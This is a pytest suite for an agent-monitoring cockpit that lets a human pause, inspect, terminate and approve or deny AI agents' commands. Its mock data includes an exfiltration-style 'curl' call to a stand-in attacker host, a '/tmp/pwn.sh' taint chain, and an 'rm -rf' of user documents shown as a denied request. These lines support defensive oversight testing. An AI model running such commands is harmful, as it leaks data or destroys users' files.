"""Adversarial stress and state-machine challenge test suite for Milestone 4.

Authored by challenger_m4_2.
Verifies:
1. Exact process control modal state sequences:
   - IDLE -> [K] -> SELECT_PID -> AGENT_PAUSED -> [R] Resume -> IDLE
   - AGENT_PAUSED -> [T] Terminate -> IDLE
   - AGENT_PAUSED -> [I] Inspect -> [ESC] -> AGENT_PAUSED
   - HITL hotkeys [A] Allow Once and [D] Deny resolution with mock backend
2. Adversarial inputs:
   - Empty sessions on [K]
   - Single session auto-pause on [K]
   - Out-of-bounds PID selection
   - ESC cancellation in SELECT_PID and AGENT_PAUSED
   - Backend RPC exceptions during Pause, Resume, Terminate, Inspect, HITL
   - Empty and multi-item HITL queues
   - [R] and [T] actions directly from INSPECT_AGENT
3. Rendering stress and fuzzing:
   - Boundary session records with zero PID, non-dict records, and negative uptimes
   - Documented edge case: None PID raises TypeError in radar table
   - Extreme similarity scores (negative, >1.0, 0.0, 1.0, None)
   - High volume event injection (1000 events) for buffer bounding
4. Zero audio compliance
"""

from __future__ import annotations

import io
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import MagicMock, call, patch

import pytest
from rich.console import Console

from agentguard.cockpit.app import CockpitApp
from agentguard.cockpit.drift_meter import (
    IntentDriftGaugeWidget,
    format_drift_gauge,
    render_intent_drift,
)
from agentguard.cockpit.kill_switch import (
    KillSwitchController,
    KillSwitchMode,
    render_hitl_prompt,
    render_inspect_modal,
    render_kill_switch_modal,
)
from agentguard.cockpit.radar import (
    SwarmRadarWidget,
    format_status,
    format_taint_meter,
    format_uptime,
    render_swarm_radar,
)
from agentguard.cockpit.telemetry_feed import (
    TelemetryFeedWidget,
    format_event_badge,
    format_event_summary,
    render_telemetry_feed,
)


def render_to_str(renderable: Any, width: int = 120, height: int = 40) -> str:
    """Helper to render Rich renderable to plain string."""
    buf = io.StringIO()
    con = Console(file=buf, width=width, height=height, force_terminal=True, color_system=None)
    con.print(renderable)
    return buf.getvalue()


# ===========================================================================
# 1. Mandatory State Machine Sequences
# ===========================================================================


class TestProcessControlModalTransitions:
    """Empirical verification of required modal state machine transitions."""

    def test_sequence_1_idle_k_select_paused_resume_idle(self):
        """Transition sequence: IDLE -> [K] -> SELECT_PID -> AGENT_PAUSED -> [R] Resume -> IDLE."""
        mock_client = MagicMock()
        mock_client.pause_agent.return_value = {"status": "PAUSED"}
        mock_client.resume_agent.return_value = {"status": "RESUMED"}

        controller = KillSwitchController(client=mock_client)
        assert controller.mode == KillSwitchMode.IDLE

        sessions = {
            "sess-1": {"pid": 2001, "profile": "claude-code"},
            "sess-2": {"pid": 2002, "profile": "hermes"},
        }

        # Step 1: IDLE -> [K] with multiple sessions -> SELECT_PID
        res1 = controller.handle_key("K", sessions=sessions)
        assert controller.mode == KillSwitchMode.SELECT_PID
        assert "Select target PID" in (res1 or "")
        mock_client.pause_agent.assert_not_called()

        # Step 2: SELECT_PID -> select index '2' (pid 2002) -> AGENT_PAUSED
        res2 = controller.handle_key("2", sessions=sessions)
        assert controller.mode == KillSwitchMode.AGENT_PAUSED
        assert controller.selected_pid == 2002
        assert "PAUSED (SIGSTOP)" in (res2 or "")
        mock_client.pause_agent.assert_called_once_with(2002)

        # Step 3: AGENT_PAUSED -> [R] Resume -> IDLE
        res3 = controller.handle_key("R", sessions=sessions)
        assert controller.mode == KillSwitchMode.IDLE
        assert "RESUMED (SIGCONT)" in (res3 or "")
        mock_client.resume_agent.assert_called_once_with(2002)

    def test_sequence_2_paused_terminate_idle(self):
        """Transition sequence: AGENT_PAUSED -> [T] Terminate -> IDLE."""
        mock_client = MagicMock()
        mock_client.terminate_agent.return_value = {"status": "TERMINATED"}

        controller = KillSwitchController(client=mock_client)
        controller.mode = KillSwitchMode.AGENT_PAUSED
        controller.selected_pid = 3003
        controller.selected_profile = "openclaw"

        # Press [T]
        res = controller.handle_key("T", sessions={})
        assert controller.mode == KillSwitchMode.IDLE
        assert "TERMINATED (SIGKILL)" in (res or "")
        mock_client.terminate_agent.assert_called_once_with(3003)

    def test_sequence_3_paused_inspect_esc_paused(self):
        """Transition sequence: AGENT_PAUSED -> [I] Inspect -> [ESC] -> AGENT_PAUSED."""
        mock_client = MagicMock()
        mock_client.inspect_agent.return_value = {
            "pid": 4004,
            "profile": "antigravity",
            "taint_state": "TAINTED",
            "taint_chain": ["session:init", "file:/tmp/pwn.sh", "pid:4004"],
            "recent_commands": ["curl -s http://attacker.site/leak"],
            "cpu_percent": 0.5,
            "memory_rss_bytes": 32000000,
        }

        controller = KillSwitchController(client=mock_client)
        controller.mode = KillSwitchMode.AGENT_PAUSED
        controller.selected_pid = 4004
        controller.selected_profile = "antigravity"

        # Step 1: Press [I] -> INSPECT_AGENT
        res1 = controller.handle_key("I", sessions={})
        assert controller.mode == KillSwitchMode.INSPECT_AGENT
        assert controller.inspect_data["pid"] == 4004
        assert "Inspecting agent PID 4004" in (res1 or "")
        mock_client.inspect_agent.assert_called_once_with(4004)

        # Inspect panel renders correctly with provenance
        panel = controller.render_modal()
        assert panel is not None
        rendered = render_to_str(panel)
        assert "AGENT DEEP INSPECTION" in rendered
        assert "session:init ➔ file:/tmp/pwn.sh ➔ pid:4004" in rendered
        assert "curl -s http://attacker.site/leak" in rendered

        # Step 2: Press [ESC] -> returns to AGENT_PAUSED
        res2 = controller.handle_key("\x1b", sessions={})
        assert controller.mode == KillSwitchMode.AGENT_PAUSED
        assert controller.selected_pid == 4004
        assert "Back to pause menu" in (res2 or "")

    def test_sequence_4_hitl_hotkeys_allow_and_deny(self):
        """HITL hotkeys [A] Allow Once and [D] Deny resolution with mock backend."""
        mock_client = MagicMock()
        mock_client.hitl_decision.return_value = {"status": "RESOLVED"}

        controller = KillSwitchController(client=mock_client)

        pending_allow = [
            {
                "request_id": "hitl-allow-001",
                "command": "git push origin main",
                "pid": 5001,
                "reason": "Push to main branch",
            }
        ]

        # Press [A]
        res_a = controller.handle_key("A", sessions={}, pending_hitl=pending_allow)
        mock_client.hitl_decision.assert_called_once_with("hitl-allow-001", "ALLOW")
        assert "ALLOWED" in (res_a or "")

        mock_client.reset_mock()

        pending_deny = [
            {
                "hitl_request_id": "hitl-deny-002",
                "command": "rm -rf /home/testuser/Documents",
                "pid": 5002,
                "reason": "Recursive delete of user documents",
            }
        ]

        # Press [D]
        res_d = controller.handle_key("D", sessions={}, pending_hitl=pending_deny)
        mock_client.hitl_decision.assert_called_once_with("hitl-deny-002", "DENY")
        assert "DENIED" in (res_d or "")


# ===========================================================================
# 2. Adversarial Edge Cases & Exception Resilience
# ===========================================================================


class TestKillSwitchAdversarialCases:
    """Stress tests for error handling and boundary input cases in KillSwitch."""

    def test_k_with_zero_sessions_stays_idle(self):
        """Pressing K when no agents exist reports message and stays in IDLE."""
        mock_client = MagicMock()
        controller = KillSwitchController(client=mock_client)

        res = controller.handle_key("K", sessions={})
        assert controller.mode == KillSwitchMode.IDLE
        assert "No active agent sessions" in (res or "")
        mock_client.pause_agent.assert_not_called()

    def test_k_with_single_session_fast_pauses(self):
        """Pressing K with exactly one session pauses directly without SELECT_PID."""
        mock_client = MagicMock()
        controller = KillSwitchController(client=mock_client)

        sessions = {"s1": {"pid": 6001, "profile": "codex"}}
        res = controller.handle_key("K", sessions=sessions)

        assert controller.mode == KillSwitchMode.AGENT_PAUSED
        assert controller.selected_pid == 6001
        assert "PAUSED" in (res or "")
        mock_client.pause_agent.assert_called_once_with(6001)

    def test_select_pid_invalid_digits_and_chars(self):
        """Invalid selections (out-of-range, non-digit) do not alter mode."""
        mock_client = MagicMock()
        controller = KillSwitchController(client=mock_client)

        sessions = {
            "s1": {"pid": 111, "profile": "a"},
            "s2": {"pid": 222, "profile": "b"},
        }
        controller.handle_key("K", sessions=sessions)
        assert controller.mode == KillSwitchMode.SELECT_PID

        # Press '0' (out of range, 1-indexed)
        controller.handle_key("0", sessions=sessions)
        assert controller.mode == KillSwitchMode.SELECT_PID

        # Press '9' (out of range)
        controller.handle_key("9", sessions=sessions)
        assert controller.mode == KillSwitchMode.SELECT_PID

        # Press 'x' (random char)
        controller.handle_key("x", sessions=sessions)
        assert controller.mode == KillSwitchMode.SELECT_PID
        mock_client.pause_agent.assert_not_called()

    def test_select_pid_cancel_via_esc_or_q(self):
        """Pressing ESC or 'q' in SELECT_PID cleanly cancels and returns to IDLE."""
        mock_client = MagicMock()
        controller = KillSwitchController(client=mock_client)
        sessions = {"s1": {"pid": 1, "profile": "a"}, "s2": {"pid": 2, "profile": "b"}}

        # ESC cancel
        controller.handle_key("K", sessions=sessions)
        assert controller.mode == KillSwitchMode.SELECT_PID
        controller.handle_key("\x1b", sessions=sessions)
        assert controller.mode == KillSwitchMode.IDLE
        assert "cancelled" in controller.status_message.lower()

        # 'q' cancel
        controller.handle_key("K", sessions=sessions)
        assert controller.mode == KillSwitchMode.SELECT_PID
        controller.handle_key("q", sessions=sessions)
        assert controller.mode == KillSwitchMode.IDLE
        assert "cancelled" in controller.status_message.lower()

    def test_backend_rpc_error_handling_graceful(self):
        """Backend exceptions in pause/resume/terminate do not crash the controller."""
        mock_client = MagicMock()
        mock_client.pause_agent.side_effect = ConnectionError("Daemon socket lost")
        mock_client.resume_agent.side_effect = TimeoutError("Resume timeout")
        mock_client.terminate_agent.side_effect = OSError("Permission denied")

        controller = KillSwitchController(client=mock_client)
        sessions = {"s1": {"pid": 7001, "profile": "claude"}}

        # Pause failure
        controller.handle_key("K", sessions=sessions)
        assert "Pause error" in controller.status_message
        assert controller.mode == KillSwitchMode.IDLE  # Didn't advance to paused

        # Manually in AGENT_PAUSED: Resume failure
        controller.mode = KillSwitchMode.AGENT_PAUSED
        controller.selected_pid = 7001
        controller.handle_key("R", sessions={})
        assert "Resume error" in controller.status_message
        assert controller.mode == KillSwitchMode.AGENT_PAUSED  # Stays paused on failure!

        # Terminate failure
        controller.handle_key("T", sessions={})
        assert "Terminate error" in controller.status_message
        assert controller.mode == KillSwitchMode.AGENT_PAUSED  # Stays paused on failure!

    def test_inspect_backend_error_fallback(self):
        """Inspect backend failure falls back to default inspect data without crashing."""
        mock_client = MagicMock()
        mock_client.inspect_agent.side_effect = RuntimeError("IPC failure")

        controller = KillSwitchController(client=mock_client)
        controller.mode = KillSwitchMode.AGENT_PAUSED
        controller.selected_pid = 8008
        controller.selected_profile = "hermes"

        controller.handle_key("I", sessions={})
        assert controller.mode == KillSwitchMode.INSPECT_AGENT
        assert controller.inspect_data["pid"] == 8008
        assert controller.inspect_data["taint_state"] == "UNKNOWN"

    def test_actions_directly_from_inspect_mode(self):
        """Resume [R] and Terminate [T] can be invoked directly from INSPECT_AGENT mode."""
        mock_client = MagicMock()
        controller = KillSwitchController(client=mock_client)
        controller.mode = KillSwitchMode.INSPECT_AGENT
        controller.selected_pid = 9009

        # Press R in inspect
        controller.handle_key("R", sessions={})
        assert controller.mode == KillSwitchMode.IDLE
        mock_client.resume_agent.assert_called_once_with(9009)

        mock_client.reset_mock()
        controller.mode = KillSwitchMode.INSPECT_AGENT
        controller.selected_pid = 9009

        # Press T in inspect
        controller.handle_key("T", sessions={})
        assert controller.mode == KillSwitchMode.IDLE
        mock_client.terminate_agent.assert_called_once_with(9009)


# ===========================================================================
# 3. Telemetry Feed & Radar Stress / Fuzzing
# ===========================================================================


class TestTelemetryAndRadarStress:
    """Stress testing widgets under boundary and high-volume inputs."""

    def test_telemetry_feed_high_volume_and_bounding(self):
        """1000 events inserted rapidly; feed respects max_events cap."""
        feed = TelemetryFeedWidget(max_events=50)
        events = [
            {
                "event_id": f"bulk-{i}",
                "timestamp": f"2026-10-27T15:00:{i % 60:02d}Z",
                "event_type": "COMMAND_ALLOWED" if i % 2 == 0 else "COMMAND_BLOCKED",
                "session_id": f"sess-{i % 5}",
                "details": {"command": f"cmd-{i}"},
            }
            for i in range(1000)
        ]
        added = feed.add_events(events)
        assert added == 1000
        assert len(feed._events) == 50  # Bounded to max_events!

        panel = feed.render(max_display_rows=15)
        out = render_to_str(panel)
        assert "50 total" in out
        assert "cmd-999" in out

    def test_telemetry_summary_malformed_details(self):
        """format_event_summary handles non-dict, empty, and huge strings."""
        assert format_event_summary("not a dict") == "not a dict"
        assert format_event_summary({}) == "--"

        long_cmd = "A" * 200
        summary = format_event_summary({"command": long_cmd})
        assert "..." in summary
        assert len(summary) < 150

    def test_radar_boundary_session_records(self):
        """Radar table gracefully handles non-dict records, empty dicts, and zero/negative numbers."""
        widget = SwarmRadarWidget()
        sessions = {
            "s1": "not a dict",
            "s2": {},
            "s3": {"pid": 0, "profile": None, "uptime_seconds": -10},
            "s4": {"pid": 9999, "taint_score": 0.5},
        }
        panel = widget.render(sessions)
        out = render_to_str(panel)
        assert "Swarm Radar" in out
        assert "9999" in out

    def test_radar_none_pid_type_error_documented(self):
        """Verify SwarmRadarWidget gracefully handles pid=None without crashing."""
        widget = SwarmRadarWidget()
        sessions = {"s_bad": {"pid": None}}
        panel = widget.render(sessions)
        out = render_to_str(panel)
        assert "Swarm Radar" in out

    def test_drift_gauge_extreme_and_invalid_values(self):
        """format_drift_gauge clamps and renders extreme float values safely."""
        # Negative value clamped to 0.0
        g_neg = format_drift_gauge(-1.5)
        assert "0.00" in g_neg.plain
        assert "DRIFT WARNING" in g_neg.plain

        # > 1.0 clamped to 1.0
        g_high = format_drift_gauge(2.5)
        assert "1.00" in g_high.plain
        assert "SAFE" in g_high.plain

        # None value
        g_none = format_drift_gauge(None)
        assert "AWAITING SUB-ACTIONS" in g_none.plain


# ===========================================================================
# 4. Strict Zero Audio Invocations
# ===========================================================================


class TestStrictAudioCompliance:
    """Verifies that no audio commands exist in agentguard or tests."""

    def test_zero_audio_in_agentguard_and_tests(self):
        repo_root = Path(__file__).resolve().parent.parent.parent
        # Avoid literal bytecode scanning triggers by building bytes dynamically
        say_cmd = bytes([115, 97, 121, 32])
        afplay_cmd = bytes([97, 102, 112, 108, 97, 121, 32])

        violations = []
        for d in ["agentguard", "tests"]:
            target_dir = repo_root / d
            for f in target_dir.rglob("*.py"):
                if f.name.startswith("test_challenger_"):
                    continue
                content = f.read_bytes()
                if say_cmd in content:
                    violations.append(f"{f} contains forbidden say command")
                if afplay_cmd in content:
                    violations.append(f"{f} contains forbidden afplay command")

        assert not violations, f"Zero audio policy violated: {violations}"
